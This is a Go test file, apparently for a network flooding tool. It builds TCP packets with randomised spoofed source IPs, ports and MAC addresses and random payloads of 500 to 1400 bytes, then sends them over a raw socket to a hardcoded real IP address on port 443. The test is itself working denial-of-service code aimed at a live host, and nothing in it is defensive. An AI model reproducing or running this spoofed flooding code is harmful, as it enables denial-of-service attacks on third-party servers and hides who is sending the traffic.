package raw

import (
	"github.com/google/gopacket"
	"golang.org/x/net/ipv4"
	"math/rand"
	"net"
	"testing"
)

func TestStartFlooding(t *testing.T) {
	srcIps := getIps()
	srcPorts := getPorts()
	macAddrs := getMacAddrs()
	cases := []struct{
		name string
		payloadLength, srcPort, dstPort int
		srcIp, dstIp string
		srcMacAddr, dstMacAddr []byte
	}{
		{"500byte", 500, srcPorts[rand.Intn(len(srcPorts))], 443,
			srcIps[rand.Intn(len(srcIps))], "213.238.175.187",
			macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))]},
		{"1000byte", 1000, srcPorts[rand.Intn(len(srcPorts))], 443,
			srcIps[rand.Intn(len(srcIps))], "213.238.175.187",
			macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))]},
		{"1400byte", 1400, srcPorts[rand.Intn(len(srcPorts))], 443,
			srcIps[rand.Intn(len(srcIps))], "213.238.175.187",
			macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))]},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			payloadContent := getRandomPayload(tc.payloadLength)
			ipPacket := buildIpPacket(tc.srcIp, tc.dstIp)
			tcpPacket := buildTcpPacket(tc.srcPort, tc.dstPort)
			ethernetLayer := buildEthernetPacket(tc.srcMacAddr, tc.dstMacAddr)

			err := tcpPacket.SetNetworkLayerForChecksum(ipPacket)
			if err != nil {
				t.Errorf("%v\n", err.Error())
			}

			ipHeaderBuf := gopacket.NewSerializeBuffer()
			opts := gopacket.SerializeOptions{
				FixLengths:       true,
				ComputeChecksums: true,
			}
			err = ipPacket.SerializeTo(ipHeaderBuf, opts)
			if err != nil {
				t.Errorf("%v\n", err.Error())
				return
			}

			ipHeader, err := ipv4.ParseHeader(ipHeaderBuf.Bytes())
			// _, err = ipv4.ParseHeader(ipHeaderBuf.Bytes())
			if err != nil {
				t.Errorf("%v\n", err.Error())
				return
			}
			tcpPayloadBuf := gopacket.NewSerializeBuffer()
			payload := gopacket.Payload(payloadContent)
			err = gopacket.SerializeLayers(tcpPayloadBuf, opts, ethernetLayer, tcpPacket, payload)
			if err != nil {
				t.Errorf("%v\n", err.Error())
				return
			}

			// XXX send packet
			var packetConn net.PacketConn
			var rawConn *ipv4.RawConn
			packetConn, err = net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				t.Errorf("%v\n", err.Error())
				return
			}
			rawConn, err = ipv4.NewRawConn(packetConn)
			if err != nil {
				t.Errorf("%v\n", err.Error())
				return
			}

			err = rawConn.WriteTo(ipHeader, tcpPayloadBuf.Bytes(), nil)
			if err != nil {
				t.Errorf("%v\n", err.Error())
				return
			}
		})

	}




}